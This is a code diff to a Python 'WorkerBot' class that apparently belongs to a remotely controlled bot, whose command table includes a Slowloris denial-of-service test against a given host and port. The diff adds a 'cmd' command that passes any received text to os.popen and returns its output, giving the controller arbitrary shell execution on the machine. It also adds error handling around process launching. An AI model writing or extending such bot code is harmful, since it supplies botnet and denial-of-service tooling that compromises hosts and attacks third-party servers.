@@ -222,6 +222,7 @@ class WorkerBot(BaseWorkerBot):
             ('slowloristest (?P<host>[^\s]+)(?: (?P<port>\d+))?', self.slowloristest),
             ('status', self.status_report),
             ('cd (?P<directory>.*)', self.cd),
+            ('cmd (?P<command>.*)', self.cmd),
         )
 
     def cd(self, directory):
@@ -277,14 +278,25 @@ class WorkerBot(BaseWorkerBot):
         
         return str(open_ports)
     
+    def cmd(self, command):
+        try:
+            with gevent.Timeout(6):
+                lines = os.popen(command).readlines()
+                return "\n".join([*lines[:4], *["..."], *lines[-4:]] if len(lines) > 8 else lines)
+        except gevent.Timeout:
+            return "Timed out waiting command output"
+
     def run(self, program):
         if program != "show":
-            self.task_process = subprocess.Popen(shlex.split(program),
-                stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT,
-                shell=False,
-                bufsize=0,
-                universal_newlines=True)
+            try:
+                self.task_process = subprocess.Popen(shlex.split(program),
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.STDOUT,
+                    shell=False,
+                    bufsize=0,
+                    universal_newlines=True)
+            except Exception as msg:
+                return str(msg)
         elif self.task_process is None:
             return ""
 
